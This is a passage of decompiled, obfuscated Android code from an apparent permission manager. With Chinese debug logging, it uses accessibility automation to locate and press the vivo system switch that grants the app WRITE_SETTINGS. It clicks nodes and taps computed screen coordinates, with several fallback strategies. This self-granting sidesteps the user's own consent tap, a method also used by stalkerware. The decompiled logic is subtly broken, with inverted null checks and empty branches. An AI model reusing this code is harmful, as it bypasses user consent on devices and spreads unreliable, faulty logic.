                                                t60.m214704c5("WriteSettingsPerm", "║ 品牌: " + Build.BRAND + ", 屏幕: " + this.f53167a1.getResources().getDisplayMetrics().widthPixels + "x" + this.f53167a1.getResources().getDisplayMetrics().heightPixels);
                                                t60.m214704c5("WriteSettingsPerm", "╚════════════════════════════════════════════════════════════");
                                                try {
                                                    if (this.f53185b9) {
                                                        Boolean boolM214689a7 = t60.m214689a7(false);
                                                        m211711f4(rootInActiveWindow2);
                                                        AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(this, null), 3);
                                                        return boolM214689a7;
                                                    }
                                                    this.f53185b9 = true;
                                                    str = "x";
                                                    long jCurrentTimeMillis = System.currentTimeMillis();
                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12 = writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1;
                                                    if (jCurrentTimeMillis - this.f53184b8 < 1200) {
                                                        Boolean boolM214689a72 = t60.m214689a7(false);
                                                        m211711f4(rootInActiveWindow2);
                                                        AbstractC0780a0.m213692a3(this.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(this, null), 3);
                                                        return boolM214689a72;
                                                    }
                                                    this.f53184b8 = jCurrentTimeMillis;
                                                    Iterator it = dh0.f55771c1.iterator();
                                                    accessibilityNodeInfo = null;
                                                    while (true) {
                                                        if (it.hasNext()) {
                                                            String str4 = (String) it.next();
                                                            AccessibilityNodeInfo accessibilityNodeInfoM211701c4 = m211701c4(rootInActiveWindow2, str4, i3);
                                                            if (accessibilityNodeInfoM211701c4 != null) {
                                                                Rect rect = new Rect();
                                                                accessibilityNodeInfoM211701c4.getBoundsInScreen(rect);
                                                                t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 找到目标文本: '" + str4 + "', 位置: " + rect);
                                                                accessibilityNodeInfo = accessibilityNodeInfoM211701c4;
                                                            } else {
                                                                t60.m214704c5("WriteSettingsPerm", "[调试] ❌ 未找到文本: '" + str4 + "'");
                                                                accessibilityNodeInfo = accessibilityNodeInfoM211701c4;
                                                                i3 = 0;
                                                            }
                                                        }
                                                    }
                                                    i = (Build.VERSION.SDK_INT > 28 || !AbstractC0779a1.m213652a5(m211706d3(), "Funtouch", true)) ? 0 : 1;
                                                    if (accessibilityNodeInfo == null) {
                                                        if (i == 0) {
                                                            c0327b22 = this;
                                                            accessibilityNodeInfo2 = rootInActiveWindow2;
                                                            t60.m214726f4("WriteSettingsPerm", "❌ 未找到vivo目标文本节点");
                                                            Boolean boolM214689a73 = t60.m214689a7(false);
                                                            c0327b22.getClass();
                                                            m211711f4(accessibilityNodeInfo2);
                                                            AbstractC0780a0.m213692a3(c0327b22.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b22, null), 3);
                                                            return boolM214689a73;
                                                        }
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = this;
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = rootInActiveWindow2;
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 1;
                                                        objM211715a4 = m211715a4(rootInActiveWindow2, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                        if (objM211715a4 != coroutineSingletons) {
                                                            c0327b22 = this;
                                                            accessibilityNodeInfo3 = rootInActiveWindow2;
                                                            accessibilityNodeInfo2 = accessibilityNodeInfo3;
                                                            if (((Boolean) objM211715a4).booleanValue()) {
                                                                Boolean boolM214689a74 = t60.m214689a7(true);
                                                                c0327b22.getClass();
                                                                m211711f4(accessibilityNodeInfo3);
                                                                AbstractC0780a0.m213692a3(c0327b22.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b22, null), 3);
                                                                return boolM214689a74;
                                                            }
                                                            t60.m214726f4("WriteSettingsPerm", "❌ 未找到vivo目标文本节点");
                                                            Boolean boolM214689a732 = t60.m214689a7(false);
                                                            c0327b22.getClass();
                                                            m211711f4(accessibilityNodeInfo2);
                                                            AbstractC0780a0.m213692a3(c0327b22.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b22, null), 3);
                                                            return boolM214689a732;
                                                        }
                                                    } else if (m211710e2()) {
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = this;
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = rootInActiveWindow2;
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52942a4 = i;
                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 2;
                                                        objM211717a6 = m211717a6(rootInActiveWindow2, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                        if (objM211717a6 != coroutineSingletons) {
                                                            c0327b2 = this;
                                                            rootInActiveWindow2 = rootInActiveWindow2;
                                                            try {
                                                                if (!((Boolean) objM211717a6).booleanValue()) {
                                                                    Boolean boolM214689a75 = t60.m214689a7(true);
                                                                    c0327b2.getClass();
                                                                    m211711f4(rootInActiveWindow2);
                                                                    AbstractC0780a0.m213692a3(c0327b2.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b2, null), 3);
                                                                    return boolM214689a75;
                                                                }
                                                                t60.m214726f4("WriteSettingsPerm", "⚠️ vivo Android 15 Switch方案失败，回退到通用方案");
                                                                accessibilityNodeInfo4 = rootInActiveWindow2;
                                                                if (i == 0) {
                                                                    Iterator it2 = dh0.f55771c1.iterator();
                                                                    AccessibilityNodeInfo accessibilityNodeInfo28 = null;
                                                                    while (it2.hasNext()) {
                                                                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = accessibilityNodeInfo4.findAccessibilityNodeInfosByText((String) it2.next());
                                                                        if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                                                            Iterator<AccessibilityNodeInfo> it3 = listFindAccessibilityNodeInfosByText.iterator();
                                                                            while (true) {
                                                                                if (it3.hasNext()) {
                                                                                    AccessibilityNodeInfo next = it3.next();
                                                                                    if (next.isVisibleToUser()) {
                                                                                        Rect rect2 = new Rect();
                                                                                        next.getBoundsInScreen(rect2);
                                                                                        if (rect2.top > 200) {
                                                                                            accessibilityNodeInfo28 = next;
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                        if (accessibilityNodeInfo28 != null) {
                                                                            if (accessibilityNodeInfo28 != null) {
                                                                                Rect rect3 = new Rect();
                                                                                accessibilityNodeInfo28.getBoundsInScreen(rect3);
                                                                                c0327b2.getClass();
                                                                                AccessibilityNodeInfo accessibilityNodeInfoM211702c7 = m211702c7(accessibilityNodeInfo4, rect3);
                                                                                if (accessibilityNodeInfoM211702c7 != null) {
                                                                                    Rect rect4 = new Rect();
                                                                                    accessibilityNodeInfoM211702c7.getBoundsInScreen(rect4);
                                                                                    float fCenterX = rect4.centerX();
                                                                                    float fCenterY = rect4.centerY();
                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b2;
                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo4;
                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 3;
                                                                                    objM211747f2 = c0327b2.m211747f2(fCenterX, fCenterY, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                                    if (objM211747f2 != coroutineSingletons) {
                                                                                        c0327b25 = c0327b2;
                                                                                        accessibilityNodeInfo6 = accessibilityNodeInfo4;
                                                                                        c0327b24 = c0327b25;
                                                                                        accessibilityNodeInfo5 = accessibilityNodeInfo6;
                                                                                        if (!((Boolean) objM211747f2).booleanValue()) {
                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b25;
                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo6;
                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 4;
                                                                                            c0327b26 = c0327b25;
                                                                                            accessibilityNodeInfo7 = accessibilityNodeInfo6;
                                                                                            if (b81.m210571b1(800L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                            }
                                                                                            if (c0327b26.m211734d5()) {
                                                                                                c0327b26.m211738e3();
                                                                                                Boolean boolM214689a76 = t60.m214689a7(true);
                                                                                                m211711f4(accessibilityNodeInfo7);
                                                                                                AbstractC0780a0.m213692a3(c0327b26.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b26, null), 3);
                                                                                                return boolM214689a76;
                                                                                            }
                                                                                            c0327b26.m211738e3();
                                                                                            Boolean boolM214689a77 = t60.m214689a7(true);
                                                                                            m211711f4(accessibilityNodeInfo7);
                                                                                            AbstractC0780a0.m213692a3(c0327b26.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b26, null), 3);
                                                                                            return boolM214689a77;
                                                                                        }
                                                                                        DisplayMetrics displayMetrics = c0327b24.f53167a1.getResources().getDisplayMetrics();
                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b24;
                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo5;
                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 5;
                                                                                        objM211747f22 = c0327b24.m211747f2(displayMetrics.widthPixels * 0.9f, displayMetrics.heightPixels * 0.25f, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                                        c0327b27 = c0327b24;
                                                                                        accessibilityNodeInfo9 = accessibilityNodeInfo5;
                                                                                        if (objM211747f22 != coroutineSingletons) {
                                                                                            c0327b23 = c0327b27;
                                                                                            accessibilityNodeInfo8 = accessibilityNodeInfo9;
                                                                                            if (!((Boolean) objM211747f22).booleanValue()) {
                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b27;
                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo9;
                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 6;
                                                                                                c0327b28 = c0327b27;
                                                                                                accessibilityNodeInfo10 = accessibilityNodeInfo9;
                                                                                                if (b81.m210571b1(800L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                                }
                                                                                                if (c0327b28.m211734d5()) {
                                                                                                    c0327b28.m211738e3();
                                                                                                    Boolean boolM214689a78 = t60.m214689a7(true);
                                                                                                    m211711f4(accessibilityNodeInfo10);
                                                                                                    AbstractC0780a0.m213692a3(c0327b28.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b28, null), 3);
                                                                                                    return boolM214689a78;
                                                                                                }
                                                                                                c0327b28.m211738e3();
                                                                                                Boolean boolM214689a79 = t60.m214689a7(true);
                                                                                                m211711f4(accessibilityNodeInfo10);
                                                                                                AbstractC0780a0.m213692a3(c0327b28.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b28, null), 3);
                                                                                                return boolM214689a79;
                                                                                            }
                                                                                            parent = accessibilityNodeInfo.getParent();
                                                                                            if (parent == null) {
                                                                                                str2 = "存在, 子节点数=" + parent.getChildCount();
                                                                                            } else {
                                                                                                str2 = "null";
                                                                                            }
                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] 父节点: " + str2);
                                                                                            if (parent != null) {
                                                                                                c0327b23.getClass();
                                                                                                AccessibilityNodeInfo accessibilityNodeInfoM211704d12 = m211704d1(parent);
                                                                                                if (accessibilityNodeInfoM211704d12 != null) {
                                                                                                    Rect rect5 = new Rect();
                                                                                                    accessibilityNodeInfoM211704d12.getBoundsInScreen(rect5);
                                                                                                    boolean zIsChecked5 = accessibilityNodeInfoM211704d12.isChecked();
                                                                                                    StringBuilder sb = new StringBuilder();
                                                                                                    str3 = "null";
                                                                                                    sb.append("[调试] ✅ 策略0: 在父节点中找到Switch控件，位置: ");
                                                                                                    sb.append(rect5);
                                                                                                    sb.append(", 当前状态=");
                                                                                                    sb.append(zIsChecked5);
                                                                                                    t60.m214704c5("WriteSettingsPerm", sb.toString());
                                                                                                    if (zIsChecked5) {
                                                                                                        t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 策略0: 开关已经是开启状态，无需点击，直接返回成功");
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 7;
                                                                                                        c0327b29 = c0327b23;
                                                                                                        accessibilityNodeInfo11 = accessibilityNodeInfo8;
                                                                                                        if (b81.m210571b1(300L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                                        }
                                                                                                        c0327b29.m211738e3();
                                                                                                        Boolean boolM214689a710 = t60.m214689a7(true);
                                                                                                        m211711f4(accessibilityNodeInfo11);
                                                                                                        AbstractC0780a0.m213692a3(c0327b29.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b29, null), 3);
                                                                                                        return boolM214689a710;
                                                                                                    }
                                                                                                    if (!rect5.isEmpty()) {
                                                                                                        boolean zPerformAction = accessibilityNodeInfoM211704d12.performAction(16);
                                                                                                        t60.m214704c5("WriteSettingsPerm", "[调试] 策略0 ACTION_CLICK: " + zPerformAction);
                                                                                                        C0327b2 c0327b225 = c0327b23;
                                                                                                        AccessibilityNodeInfo accessibilityNodeInfo29 = accessibilityNodeInfo8;
                                                                                                        if (!zPerformAction) {
                                                                                                            float fCenterX2 = rect5.centerX();
                                                                                                            float fCenterY2 = rect5.centerY();
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = parent;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 8;
                                                                                                            objM211747f23 = c0327b23.m211747f2(fCenterX2, fCenterY2, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                                                            c0327b210 = c0327b23;
                                                                                                            accessibilityNodeInfo14 = accessibilityNodeInfo8;
                                                                                                            if (objM211747f23 == coroutineSingletons) {
                                                                                                            }
                                                                                                            if (((Boolean) objM211747f23).booleanValue()) {
                                                                                                                z = false;
                                                                                                                c0327b23 = c0327b210;
                                                                                                                accessibilityNodeInfo8 = accessibilityNodeInfo14;
                                                                                                                if (!z) {
                                                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = parent;
                                                                                                                    writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 9;
                                                                                                                    if (b81.m210571b1(500L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) != coroutineSingletons) {
                                                                                                                        accessibilityNodeInfo12 = accessibilityNodeInfo8;
                                                                                                                        accessibilityNodeInfo13 = accessibilityNodeInfo;
                                                                                                                        c0327b23 = c0327b23;
                                                                                                                        try {
                                                                                                                            rootInActiveWindow = c0327b23.f53166a0.getRootInActiveWindow();
                                                                                                                            if (rootInActiveWindow == null) {
                                                                                                                                t60.m214694b5(parent, "parent");
                                                                                                                                accessibilityNodeInfoM211704d1 = m211704d1(parent);
                                                                                                                            } else {
                                                                                                                                accessibilityNodeInfoM211704d1 = null;
                                                                                                                            }
                                                                                                                            zIsChecked = accessibilityNodeInfoM211704d1 == null ? accessibilityNodeInfoM211704d1.isChecked() : true;
                                                                                                                            m211711f4(rootInActiveWindow);
                                                                                                                            if (!zIsChecked) {
                                                                                                                                t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 策略0点击成功! 开关已开启");
                                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo12;
                                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 10;
                                                                                                                                c0327b211 = c0327b23;
                                                                                                                                if (b81.m210571b1(300L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                                                                }
                                                                                                                                c0327b211.m211738e3();
                                                                                                                                Boolean boolM214689a711 = t60.m214689a7(true);
                                                                                                                                m211711f4(accessibilityNodeInfo12);
                                                                                                                                AbstractC0780a0.m213692a3(c0327b211.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b211, null), 3);
                                                                                                                                return boolM214689a711;
                                                                                                                            }
                                                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] ⚠️ 策略0点击后开关仍关闭，继续尝试");
                                                                                                                            accessibilityNodeInfo = accessibilityNodeInfo13;
                                                                                                                            accessibilityNodeInfo8 = accessibilityNodeInfo12;
                                                                                                                        } catch (Exception e) {
                                                                                                                            e = e;
                                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = c0327b23;
                                                                                                                            rootInActiveWindow2 = accessibilityNodeInfo12;
                                                                                                                            t60.m214705c6("WriteSettingsPerm", "❌ vivo右侧开关方案异常", e);
                                                                                                                            Boolean boolM214689a712 = t60.m214689a7(false);
                                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                                                                                            m211711f4(rootInActiveWindow2);
                                                                                                                            AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                                                                                            return boolM214689a712;
                                                                                                                        } catch (Throwable th) {
                                                                                                                            th = th;
                                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1 = c0327b23;
                                                                                                                            rootInActiveWindow2 = accessibilityNodeInfo12;
                                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.getClass();
                                                                                                                            m211711f4(rootInActiveWindow2);
                                                                                                                            AbstractC0780a0.m213692a3(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(writeSettingsPermissionManager$attemptVivoRightSwitchToggle$1, null), 3);
                                                                                                                            throw th;
                                                                                                                        }
                                                                                                                    }
                                                                                                                }
                                                                                                            } else {
                                                                                                                c0327b225 = c0327b210;
                                                                                                                accessibilityNodeInfo29 = accessibilityNodeInfo14;
                                                                                                            }
                                                                                                        }
                                                                                                        z = true;
                                                                                                        c0327b23 = c0327b225;
                                                                                                        accessibilityNodeInfo8 = accessibilityNodeInfo29;
                                                                                                        if (!z) {
                                                                                                        }
                                                                                                    }
                                                                                                }
                                                                                                if (parent != null || parent.getChildCount() < 2) {
                                                                                                    t60.m214726f4("WriteSettingsPerm", "❌ 父节点不存在或子节点不足，无法使用第二个子节点坐标 → 启用兜底方案");
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 兜底1: 查找全局可见Switch控件...");
                                                                                                    c0327b23.getClass();
                                                                                                    accessibilityNodeInfoM211700c2 = m211700c2(accessibilityNodeInfo8);
                                                                                                    if (accessibilityNodeInfoM211700c2 != null) {
                                                                                                        Rect rect6 = new Rect();
                                                                                                        accessibilityNodeInfoM211700c2.getBoundsInScreen(rect6);
                                                                                                        boolean zIsChecked6 = accessibilityNodeInfoM211700c2.isChecked();
                                                                                                        AccessibilityNodeInfo accessibilityNodeInfo30 = accessibilityNodeInfo;
                                                                                                        t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 兜底1找到Switch: 位置=" + rect6.left + "," + rect6.top + "," + rect6.right + "," + rect6.bottom + ", 当前状态=" + zIsChecked6);
                                                                                                        if (zIsChecked6) {
                                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 兜底1: 开关已经是开启状态，无需点击，直接返回成功");
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                            writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 11;
                                                                                                            c0327b212 = c0327b23;
                                                                                                            accessibilityNodeInfo15 = accessibilityNodeInfo8;
                                                                                                            if (b81.m210571b1(300L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                                            }
                                                                                                            c0327b212.m211738e3();
                                                                                                            Boolean boolM214689a713 = t60.m214689a7(true);
                                                                                                            m211711f4(accessibilityNodeInfo15);
                                                                                                            AbstractC0780a0.m213692a3(c0327b212.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b212, null), 3);
                                                                                                            return boolM214689a713;
                                                                                                        }
                                                                                                        if (rect6.isEmpty()) {
                                                                                                            accessibilityNodeInfo = accessibilityNodeInfo30;
                                                                                                        } else {
                                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] 🎯 兜底1点击Switch中心: (" + rect6.centerX() + ", " + rect6.centerY() + ")");
                                                                                                            boolean zPerformAction2 = accessibilityNodeInfoM211700c2.performAction(16);
                                                                                                            StringBuilder sb2 = new StringBuilder();
                                                                                                            sb2.append("[调试] 兜底1 ACTION_CLICK: ");
                                                                                                            sb2.append(zPerformAction2);
                                                                                                            t60.m214704c5("WriteSettingsPerm", sb2.toString());
                                                                                                            if (zPerformAction2) {
                                                                                                                accessibilityNodeInfo = accessibilityNodeInfo30;
                                                                                                                c0327b213 = c0327b23;
                                                                                                                accessibilityNodeInfo16 = accessibilityNodeInfo8;
                                                                                                                z2 = true;
                                                                                                                c0327b23 = c0327b213;
                                                                                                                accessibilityNodeInfo8 = accessibilityNodeInfo16;
                                                                                                                if (z2) {
                                                                                                                }
                                                                                                            } else {
                                                                                                                float fCenterX3 = rect6.centerX();
                                                                                                                float fCenterY3 = rect6.centerY();
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                                accessibilityNodeInfo = accessibilityNodeInfo30;
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                                writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 12;
                                                                                                                objM211747f24 = c0327b23.m211747f2(fCenterX3, fCenterY3, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12);
                                                                                                                c0327b214 = c0327b23;
                                                                                                                accessibilityNodeInfo17 = accessibilityNodeInfo8;
                                                                                                                if (objM211747f24 == coroutineSingletons) {
                                                                                                                }
                                                                                                                if (((Boolean) objM211747f24).booleanValue()) {
                                                                                                                    z2 = false;
                                                                                                                    c0327b23 = c0327b214;
                                                                                                                    accessibilityNodeInfo8 = accessibilityNodeInfo17;
                                                                                                                    if (z2) {
                                                                                                                    }
                                                                                                                } else {
                                                                                                                    c0327b213 = c0327b214;
                                                                                                                    accessibilityNodeInfo16 = accessibilityNodeInfo17;
                                                                                                                    z2 = true;
                                                                                                                    c0327b23 = c0327b213;
                                                                                                                    accessibilityNodeInfo8 = accessibilityNodeInfo16;
                                                                                                                    if (z2) {
                                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = accessibilityNodeInfo;
                                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
                                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52945a7 = 13;
                                                                                                                        c0327b23 = c0327b23;
                                                                                                                        accessibilityNodeInfo8 = accessibilityNodeInfo8;
                                                                                                                        if (b81.m210571b1(500L, writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12) == coroutineSingletons) {
                                                                                                                        }
                                                                                                                        AccessibilityNodeInfo rootInActiveWindow3 = c0327b23.f53166a0.getRootInActiveWindow();
                                                                                                                        AccessibilityNodeInfo accessibilityNodeInfoM211700c22 = rootInActiveWindow3 == null ? m211700c2(rootInActiveWindow3) : null;
                                                                                                                        zIsChecked3 = accessibilityNodeInfoM211700c22 == null ? accessibilityNodeInfoM211700c22.isChecked() : true;
                                                                                                                        m211711f4(rootInActiveWindow3);
                                                                                                                        if (!zIsChecked3) {
                                                                                                                            t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 兜底1点击成功! 开关已开启");
                                                                                                                            Boolean boolM214689a714 = t60.m214689a7(true);
                                                                                                                            m211711f4(accessibilityNodeInfo8);
                                                                                                                            AbstractC0780a0.m213692a3(c0327b23.f53168a2, null, new WriteSettingsPermissionManager$attemptVivoRightSwitchToggle$2(c0327b23, null), 3);
                                                                                                                            return boolM214689a714;
                                                                                                                        }
                                                                                                                        t60.m214704c5("WriteSettingsPerm", "[调试] ⚠️ 兜底1点击后开关仍关闭，继续尝试");
                                                                                                                    }
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    } else {
                                                                                                        t60.m214704c5("WriteSettingsPerm", "[调试] ❌ 兜底1未找到Switch，进入兜底2");
                                                                                                    }
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 兜底2: 使用文本Y + 屏幕宽88%...");
                                                                                                    Rect rect7 = new Rect();
                                                                                                    accessibilityNodeInfo.getBoundsInScreen(rect7);
                                                                                                    DisplayMetrics displayMetrics2 = c0327b23.f53167a1.getResources().getDisplayMetrics();
                                                                                                    int i4 = displayMetrics2.widthPixels;
                                                                                                    int i5 = displayMetrics2.heightPixels;
                                                                                                    int i6 = (int) (i4 * 0.88f);
                                                                                                    int iCenterY = rect7.centerY();
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 屏幕: " + i4 + str + i5);
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 文本位置: " + rect7.left + "," + rect7.top + "," + rect7.right + "," + rect7.bottom);
                                                                                                    StringBuilder sb3 = new StringBuilder();
                                                                                                    sb3.append("[调试] 🎯 兜底2点击: (");
                                                                                                    sb3.append(i6);
                                                                                                    sb3.append(", ");
                                                                                                    sb3.append(iCenterY);
                                                                                                    sb3.append(") [X=屏幕宽*0.88, Y=文本Y居中]");
                                                                                                    t60.m214704c5("WriteSettingsPerm", sb3.toString());
                                                                                                    AccessibilityNodeInfo accessibilityNodeInfoM211700c23 = m211700c2(accessibilityNodeInfo8);
                                                                                                    zIsChecked2 = accessibilityNodeInfoM211700c23 != null ? accessibilityNodeInfoM211700c23.isChecked() : false;
                                                                                                    t60.m214704c5("WriteSettingsPerm", "[调试] 兜底2当前开关状态: " + zIsChecked2);
                                                                                                    if (zIsChecked2) {
                                                                                                        t60.m214704c5("WriteSettingsPerm", "[调试] ✅ 兜底2: 开关已经是开启状态，无需点击，直接返回成功");
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52938a0 = c0327b23;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52939a1 = accessibilityNodeInfo8;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52940a2 = null;
                                                                                                        writeSettingsPermissionManager$attemptVivoRightSwitchToggle$12.f52941a3 = null;
